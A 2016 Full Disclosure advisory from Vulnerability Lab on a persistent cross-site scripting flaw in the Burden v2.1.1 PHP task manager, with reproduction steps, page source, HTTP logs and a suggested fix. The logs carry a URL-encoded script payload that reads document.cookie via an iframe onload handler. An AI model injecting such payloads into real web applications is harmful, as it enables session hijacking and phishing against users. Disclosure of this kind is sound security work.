
Date: Mon, 28 Nov 2016 12:13:03 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Burden TMA v2.1.1 - (Task) Persistent Web Vulnerability

Document Title:
===============
Burden TMA v2.1.1 - (Task) Persistent Web Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=1998


Release Date:
=============
2016-11-26


Vulnerability Laboratory ID (VL-ID):
====================================
1998


Common Vulnerability Scoring System:
====================================
3


Product & Service Introduction:
===============================
Burden is a full featured task management app written in PHP. The script provides an easy way to add, edit or delete tasks. 
Tasks are highlighted in different colours depending on their importance and whether or not they are overdue. Each task can 
also be marked as completed or incomplete. Full sorting and task searching is also included. Please note Burden uses the 
UK date format of DD/MM/YYYY.

(Copy of the Homepage: https://github.com/joshf/Burden/releases/2.1.1 )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered persistent input validation web vulnerability in the Burden v2.1.1 task management application.


Vulnerability Disclosure Timeline:
==================================
2016-11-07:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Josh F.
Product: Burden - Task Management Application (CMS) 2.1.1


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered  in the Burden v2.1.1 task management application.
The vulnerability allows remote attackers to inject own malicious script code to the vulnerable module or functions.

The input validation web vulnerability is located in the `task` and `detail` parameters of the `Add` module. Remote attackers 
are able to inject own malicious script code via `Add` POST method request to manipulate the index listing of the task. 
The web validation of the application list is not secure parsed and allows to execute the malicious script codes. The injection 
point are the details and task input fields and the execution point occurs in the task list on preview.

The security risk of the vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.3.
Exploitation of the persistent validation vulnerability requires no user interaction and a low privilege web-application user account.
Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent external redirects 
to malicious source and persistent manipulation of affected or connected application modules.


Request Method(s):
[+] POST

Vulnerable Module(s):
[+] Add Task

Vulnerable Parameter(s):
[+] task
[+] detail

Affected Module(s):
[+] Task List


Proof of Concept (PoC):
=======================
The persistent validation vulnerability can be exploited by local attackers with access to the task application with low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Inject:
http://burden.localhost:8000/burden/worker.php

Execute:
http://burden.localhost:8000/burden/index.php


Manual steps to reproduce the vulnerability ...
1. Open the task management application
2. Add a new task to the index
3. Inject a payload in the task name and details input fields and save by processing via POST
4. Refresh the index list and the payload executes within the item list context
5. Successful reproduce of the input validation vulnerability!


PoC: Vulnerable Source
<div class="container">
<div class="page-header">
<h1>Tasks
<small>Current</small></h1></div><div class="notifications top-right"></div><noscript><div class="alert alert-info">
<h4 class="alert-heading">Information</h4><p>Please enable JavaScript to use Burden. For instructions on how to do this, 
see <a href="http://www.activatejavascript.org" class="alert-link" target="_blank">here</a>.</p></div></noscript>
<ul class="list-group"><li class="list-group-item" id="1">
<span class="details" data-id="1">&gt;"<[MALICIOUS SCRIPT CODE EXECUTION POINT VIA TASK NAME & DETAILS INPUT]></span>
<div class="pull-right"><span class="label label-danger" data-id="1">05-11-2016</span> <span class="edit glyphicon 
glyphicon-edit" data-id="1"></span> <span class="complete glyphicon glyphicon-ok" data-id="1"></span></div></li></ul>
<button type="button" id="launchaddmodal" class="btn btn-default">Add</button><br><br>
<div class="alert alert-info"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
<strong>Info:</strong> High priority tasks are highlighted yellow, completed tasks green, tasks due today in blue and 
overdue tasks red.</div>


--- PoC Session Logs [POST] ---
Status: 200[OK]
POST http://burden.localhost:8000/burden/worker.php 
Mime Type[text/html]
   Request Header:
      Host[burden.localhost:8000]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0]
      Accept[*/*]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Requested-With[XMLHttpRequest]
      Referer[http://burden.localhost:8000/burden/index.php]
      Cookie[burdenupdatecheck=1478378136; g3sid=13e938f0028945d17f32c164f7a9d904f84dfe8e%7E8br7cg0v7kr8mqut1q256vq542; _pk_id.2.bb5e=8b2f85bd26c204d7.1478373106.1.1478378139.1478373106.; _pk_ref.2.bb5e=%5B%22%22%2C%22%22%2C1478373106%2C%22http%3A%2F%2Fwww.localhost:8000%2Fdemo%2F1%2F343%2FGallery%22%5D; _pk_ses.2.bb5e=*; PHPSESSID=pau398b2k2gpsafkbh0pdhjvk7; style=light; fpsess_fp-1e75c479=lga9cq01l07l3saacpckkch315; sweetrice=pivnlb7shfokqhi1fdsi1s4qb3]
      Connection[keep-alive]
   POST-Daten:
      task[%3E%22%3Cimg+src%3D%22x%22%3E%3E%22%3Ciframe+src%3Da+onload%3Dalert(document.cookie)%3E]
      details[%3E%22%3Cimg+src%3D%22x%22%3E%3E%22%3Ciframe+src%3Da+onload%3Dalert(document.cookie)%3E]
      due[05-11-2016]
      category[none]
      newcategoryforaddform[]
      action[add]
   Response Header:
      Server[nginx/1.2.1]
      Content-Type[text/html]
      Connection[keep-alive]
      X-Powered-By[PHP/5.5.27-1+deb.sury.org~precise+1]
-
Status: 200[OK]
GET http://burden.localhost:8000/burden/index.php
Mime Type[text/html]
   Request Header:
      Host[burden.localhost:8000]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Referer[http://burden.localhost:8000/burden/settings.php]
      Cookie[burdenupdatecheck=1478378136; g3sid=13e938f0028945d17f32c164f7a9d904f84dfe8e%7E8br7cg0v7kr8mqut1q256vq542; _pk_id.2.bb5e=8b2f85bd26c204d7.1478373106.1.1478378139.1478373106.; _pk_ref.2.bb5e=%5B%22%22%2C%22%22%2C1478373106%2C%22http%3A%2F%2Fwww.localhost:8000%2Fdemo%2F1%2F343%2FGallery%22%5D; _pk_ses.2.bb5e=*; PHPSESSID=pau398b2k2gpsafkbh0pdhjvk7; style=light; fpsess_fp-1e75c479=lga9cq01l07l3saacpckkch315; sweetrice=pivnlb7shfokqhi1fdsi1s4qb3]
      Connection[keep-alive]
      Upgrade-Insecure-Requests[1]
      Cache-Control[max-age=0]
   Response Header:
      Server[nginx/1.2.1]
      Content-Type[text/html]
      Transfer-Encoding[chunked]
      Connection[keep-alive]
      X-Powered-By[PHP/5.5.27-1+deb.sury.org~precise+1]
      Set-Cookie[burdenupdatecheck=1478378168; expires=Sat; Max-Age=604800]
-
Status: 200[OK]
GET http://burden.localhost:8000/burden/x[MALICIOUS EXECUTION POINT!]
Mime Type[text/html]
   Request Header:
      Host[burden.localhost:8000]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0]
      Accept[*/*]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://burden.localhost:8000/burden/index.php]
      Cookie[burdenupdatecheck=1478378168; g3sid=13e938f0028945d17f32c164f7a9d904f84dfe8e%7E8br7cg0v7kr8mqut1q256vq542; _pk_id.2.bb5e=8b2f85bd26c204d7.1478373106.1.1478378139.1478373106.; _pk_ref.2.bb5e=%5B%22%22%2C%22%22%2C1478373106%2C%22http%3A%2F%2Fwww.localhost:8000%2Fdemo%2F1%2F343%2FGallery%22%5D; _pk_ses.2.bb5e=*; PHPSESSID=pau398b2k2gpsafkbh0pdhjvk7; style=light; fpsess_fp-1e75c479=lga9cq01l07l3saacpckkch315; sweetrice=pivnlb7shfokqhi1fdsi1s4qb3]
      DNT[1]
      Connection[keep-alive]
   Response Header:
      Server[nginx/1.2.1]
      Content-Type[text/html; charset=iso-8859-1]
      Transfer-Encoding[chunked]
      Connection[keep-alive]


Reference(s):
http://burden.localhost:8000/
http://burden.localhost:8000/burden/
http://burden.localhost:8000/burden/index.php
http://burden.localhost:8000/burden/worker.php


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse of the task and details parameters in the add to create post method request.
Disallow the usage of special chars and filter the input to prevent further injection attacks. Encode the output location to 
prevent the execution point of the issue to resolve the vulnerability.


Security Risk:
==============
The security risk of the persistent input validation vulnerability in the tma web-application is estimated as medium. (CVSS 3.3)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, 
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/